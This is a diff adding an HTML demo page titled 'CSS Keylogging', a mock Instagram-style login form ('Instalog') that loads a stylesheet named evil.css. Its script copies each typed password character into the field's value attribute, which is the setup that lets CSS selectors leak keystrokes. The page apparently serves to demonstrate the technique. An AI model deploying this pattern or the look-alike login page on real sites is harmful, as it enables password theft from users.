@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <title> CSS Keylogging </title>
+    <link href="/css/evil.css" rel="stylesheet" type="text/css"/>
+    <link href="/css/index.css" rel="stylesheet" type="text/css"/>
+</head>
+<body>
+    <main>
+        <div class="card">
+            <h1> Instalog </h1>
+            <div class="floating-placeholder">
+                <input type="text" name="user" />
+                <label for="user">Phone number, username or email</label>
+            </div>
+            <div class="floating-placeholder">
+                <input id="password" type="password" name="pass" />
+                <label for="pass">Password</label>
+            </div>
+            <button id="login"> Log in </button>
+            <span class="forgot"> Forgot password? </span>
+
+            <script type="text/javascript">
+                function floaty(e) {
+                    let el = e.target;
+                    setTimeout(function() {
+                        if(el.value != "")
+                            el.parentElement.classList.add("float");
+                        else
+                            el.parentElement.classList.remove("float");
+                    }, 1);
+                }
+                document.querySelectorAll(".floating-placeholder input").forEach(e => e.onkeydown = floaty);
+                document.querySelectorAll(".floating-placeholder input").forEach(e => e.onchange = floaty);
+                document.querySelectorAll(".floating-placeholder input").forEach(e => e.onblur = floaty);
+
+                document.getElementById("password").oninput = e => e.target.setAttribute("value", e.target.value);
+            </script>
+        </div>
+        <div class="card signup"> Don't have an account? <span class="blue">Sign up</span> </div>
+    </main>
+</body>
+</html>
+
+
